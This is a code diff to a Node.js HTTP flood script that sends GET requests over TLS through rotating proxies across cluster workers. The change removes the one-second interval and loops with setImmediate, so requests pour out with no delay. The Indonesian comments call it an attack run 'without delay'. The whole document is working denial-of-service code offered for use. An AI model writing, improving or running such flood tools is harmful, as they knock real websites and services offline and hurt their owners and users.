@@ -55,14 +55,18 @@ if (cluster.isMaster) {
         };
 
         const client = tls.connect(options, () => {
-            for (let i = 0; i < rps; i++) {
-                const request = `GET ${target.pathname} HTTP/1.1\r\n` +
-                                `Host: ${target.hostname}\r\n` +
-                                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
-                                "Accept: */*\r\n" +
-                                "Connection: keep-alive\r\n\r\n";
-                client.write(request);
+            function flood() {
+                for (let i = 0; i < rps; i++) {
+                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
+                                    `Host: ${target.hostname}\r\n` +
+                                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
+                                    "Accept: */*\r\n" +
+                                    "Connection: keep-alive\r\n\r\n";
+                    client.write(request);
+                }
+                setImmediate(flood); // Tidak ada delay, loop terus
             }
+            flood();
         });
 
         client.on("error", () => {
@@ -74,8 +78,11 @@ if (cluster.isMaster) {
         });
     }
 
-    setInterval(() => {
+    function attackLoop() {
         const proxy = proxies[Math.floor(Math.random() * proxies.length)];
         sendTLSRequest(proxy);
-    }, 1000);
+        setImmediate(attackLoop); // Tidak ada delay, langsung loop lagi
+    }
+
+    attackLoop(); // Jalankan serangan tanpa delay
 }
